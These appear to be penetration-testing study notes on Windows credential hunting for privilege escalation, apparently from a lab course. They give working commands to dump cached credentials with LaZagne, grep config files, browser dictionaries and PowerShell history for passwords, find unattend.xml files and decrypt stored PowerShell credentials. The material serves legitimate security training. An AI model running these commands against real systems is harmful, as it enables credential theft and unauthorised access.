Credentials can unlock many doors for us during our assessments. We may find credentials during our privilege escalation enumeration that can lead directly to local admin access, grant us a foothold into the Active Directory domain environment, or even be used to escalate privileges within the domain. There are many places that we may find credentials on a system, some more obvious than others.

#### Lazagne
Dump all cached credentials using [Lazagne](https://github.com/AlessandroZ/LaZagne)
```powershell
lazagne.exe all
```
##### Files
```powershell
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```

##### **Chrome Dictionary Files**
For example, sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the distracting red underline.
```powershell
gc 'C:\Users\htb-student\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password
```

##### Unattended Installation Files
Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Passwords in the unattend.xml are stored in plaintext or base64 encoded.

```powershell
where.exe /R C:\ unattend.xml
```

```xml
<?xml version="1.0" encoding="utf-8"?>
<unattend xmlns="urn:schemas-microsoft-com:unattend">
    <settings pass="specialize">
        <component name="Microsoft-Windows-Shell-Setup" processorArchitecture="amd64" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" xmlns:wcm="http://schemas.microsoft.com/WMIConfig/2002/State" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <AutoLogon>
                <Password>
                    <Value>local_4dmin_p@ss</Value>
                    <PlainText>true</PlainText>
                </Password>
                <Enabled>true</Enabled>
                <LogonCount>2</LogonCount>
                <Username>Administrator</Username>
            </AutoLogon>
            <ComputerName>*</ComputerName>
        </component>
    </settings>
```

##### Powershell Histroy
```powershell
gc (Get-PSReadLineOption).HistorySavePath 

foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```

##### PowerShell Credentials
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using [DPAPI](https://en.wikipedia.org/wiki/Data_Protection_API), which typically means they can only be decrypted by the same user on the same computer they were created on.

Example
```powershell
# Connect-VC.ps1
# Get-Credential | Export-Clixml -Path 'C:\scripts\pass.xml'
$encryptedPassword = Import-Clixml -Path 'C:\scripts\pass.xml'
$decryptedPassword = $encryptedPassword.GetNetworkCredential().Password
Connect-VIServer -Server 'VC-01' -User 'bob_adm' -Password $decryptedPassword
```

Decrypting PowerShell Credentials
```powershell
PS C:\htb> $credential = Import-Clixml -Path 'C:\scripts\pass.xml'
PS C:\htb> $credential.GetNetworkCredential().username

bob

PS C:\htb> $credential.GetNetworkCredential().password

Str0ng3ncryptedP@ss!
```

#### Windows Search 
![[Pasted image 20250114061203.png]]

| Passwords     | Passphrases  | Keys        |
| ------------- | ------------ | ----------- |
| Username      | User account | Creds       |
| Users         | Passkeys     | Passphrases |
| configuration | dbcredential | dbpassword  |
| pwd           | Login        | Credentials |